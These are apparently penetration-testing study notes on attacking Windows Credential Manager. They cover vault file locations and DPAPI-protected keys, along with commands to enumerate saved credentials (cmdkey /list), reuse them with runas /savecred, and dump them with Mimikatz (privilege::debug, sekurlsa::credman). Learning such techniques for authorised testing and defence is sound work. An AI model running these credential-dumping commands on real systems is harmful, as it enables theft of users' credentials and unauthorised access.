## Attacking Windows Credential Manager

Credentials stored in:

```
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```

Every vault contains a file named:

```
Policy.vpol
```

This file contains AES keys. These keys are protected by DPAPI.

#### Credential Guard

Stores DPAPI security master keys inside **Virtualization Based Security (VBS)** secure memory enclaves.

### Credential Locker

These are the actual encrypted folders where credentials are stored.

#### Types of Credentials

- Web creds
- Windows creds

Credential vaults can be exported into **.crd** files.

Command:

```
rundll32 keymgr.dll,KRShowKeyMgr
```

### Enumerating Stored Credentials

View saved credentials: (cmdkey to view saved creds) List Cred:

```
cmdkey /list
```

### Using Stored Credentials with runas

```
runas /savecred /user:USERNAME SRV01\nc\handles.cmd
```

### Extracting Credentials with Mimikatz

Provides many methods like:

- sekurlsa
- dpapi

Start Mimikatz:

```
mimikatz.exe
```

Enable debug privilege:

```
privilege::debug
```

Dump Credential Manager data:

```
sekurlsa::credman
```
